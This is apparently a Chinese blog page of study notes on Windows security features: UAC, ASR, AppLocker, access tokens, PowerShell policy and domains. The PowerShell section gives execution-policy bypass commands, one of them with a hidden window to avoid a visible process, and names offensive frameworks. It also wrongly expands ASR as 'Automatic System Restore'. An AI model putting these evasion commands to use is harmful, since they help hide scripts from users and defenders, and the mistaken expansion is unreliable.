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" alt="Do you want to allow this app to make  changes to your device?  Procexp  Verified publisher. Microsoft Corporation  File Hard drive on this computer  Show more "></p><p>​触发UAC的操作</p><p>​Windows更新、增加&#x2F;删除用户、更改账户类型、安装&#x2F;删除程序、安装驱动、设置家长控制。。。</p><h2 id="8-Windows-ASR（win-10-1709-、win-2016以上）"><a href="#8-Windows-ASR（win-10-1709-、win-2016以上）" class="headerlink" title="8.Windows ASR（win 10 1709 、win 2016以上）"></a>8.Windows ASR（win 10 1709 、win 2016以上）</h2><p>​Automatic System Restore ——自动系统恢复</p><p>​通过配置规则，防止电脑被攻击</p><p>​常用防止攻击方式</p><p>​office钓鱼、usb、驱动下载攻击、apk攻击</p><p>​打开方式</p><p>​Gpedit.msc组策略编辑器-&gt;计算机设置-&gt;管理模板-&gt;windows组件-&gt;windows defender-&gt;攻击防护-&gt;ASR攻击面减少</p><p>​asr规则</p><p>​未配置：禁用asr–&gt;0</p><p>​阻止：启用asr–&gt;1</p><p>​审核：评估影响–&gt;2</p><p>​设置asr规则（powershell下）</p><p>​<a href="https://docs.microsoft.com/zh-cn/windows/security/threat-protection/microsoft-defender-atp/customize-attack-surface-reduction">https://docs.microsoft.com/zh-cn/windows/security/threat-protection/microsoft-defender-atp/customize-attack-surface-reduction</a></p><p>​查看规则效果</p><p>​事件查看器：eventvwr.msc </p><h2 id="9-Windows-applocker（win-7以上，手动添加）"><a href="#9-Windows-applocker（win-7以上，手动添加）" class="headerlink" title="9.Windows applocker（win 7以上，手动添加）"></a>9.Windows applocker（win 7以上，手动添加）</h2><p>​应用程序控制策略</p><p>​启用applocker：Services.msc-application identity</p><p>​查看applocker：Secpot.msc-application control policies-applocker</p><p>​applocker规则（阻止的文件）</p><p>​可执行文件：exe、com</p><p>​脚本：psl、bat、vbs</p><p>​安装文件：.msi</p><p>​dll文件</p><p>​applocker规则条件</p><p>​发布者(数字签名进行标识)、路径、文件hash</p><h2 id="10-Windows-access-token"><a href="#10-Windows-access-token" class="headerlink" title="10.Windows access token"></a>10.Windows access token</h2><p>​用户访问令牌，描述线程安全的一个对象，不同的用户登录会生成一个对应的令牌，用户创建线程的时候会进行权限的拷贝</p><p>​组成：用户sid、用户组sid、用户登录信息的sid、其他信息</p><h2 id="11-Windows-PowerShell（win7以上自带）"><a href="#11-Windows-PowerShell（win7以上自带）" class="headerlink" title="11.Windows PowerShell（win7以上自带）"></a>11.Windows PowerShell（win7以上自带）</h2><p>​内存执行，具有隐蔽性，易于绕过杀软</p><p>​后缀：<code>.ps1</code></p><p>​版本：Win7-2.0、win8-3.0、win8.1-4.0、win10-5.0</p><p>​<code>get-host</code>：获取版本信息</p><p>​策略</p><p>​<code>restricted</code>：禁止一切运行</p><p>​<code>remotesigned</code>：本地ok，远程不行</p><p>​<code>allsigned</code>：拥有签名的可以运行</p><p>​<code>unrestricted</code>：允许一切运行</p><p>​<code>Get-ExecutionPolicy</code>：查看当前执行策略</p><p>​<code>Set-ExcutionPolicy</code>：设置策略</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\administrator.MCITP\Desktop&gt; <span class="built_in">set-executionpolicy</span></span><br><span class="line"></span><br><span class="line">位于命令管道位置 <span class="number">1</span> 的 cmdlet <span class="built_in">Set-ExecutionPolicy</span></span><br><span class="line">请为以下参数提供值:</span><br><span class="line">ExecutionPolicy: unrestricted</span><br><span class="line"><span class="built_in">PS</span> C:\Users\administrator.MCITP\Desktop&gt;</span><br></pre></td></tr></table></figure><p>​绕过策略的命令</p><p>​<code>powershell.exe -ep Bypass -File .\powershell脚本</code> 此方法会有一个进程出现</p><p>​<code>powershell.exe -ep Bypass -WindowsStyle Hidden -Nologo -Nointeractive -Noprofile .\powershll脚本</code> 此方法可以避免进程的出现</p><p>​常用的脚本：powersplit、nishang、empire、powercat</p><h2 id="12-Windows域"><a href="#12-Windows域" class="headerlink" title="12.Windows域"></a>12.Windows域</h2><p>​域控：DC，域内主机都会经过DC处理</p><p><img src="data:image/png;base64,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